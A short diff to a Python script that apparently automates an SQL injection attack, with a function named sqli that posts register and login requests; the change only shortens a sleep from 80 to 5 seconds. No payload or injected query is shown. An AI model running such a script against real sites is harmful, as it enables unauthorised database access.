@@ -55,6 +55,6 @@ def sqli(filename, sess_id):
             r_register = requests.post(register_url, data=mydata_register, headers=headers_register)
             r_login = requests.post(login_url, data=mydata_login, headers=headers_login)
 
-time.sleep(80)
+time.sleep(5)
 session = get_session()
 sqli(file, session)
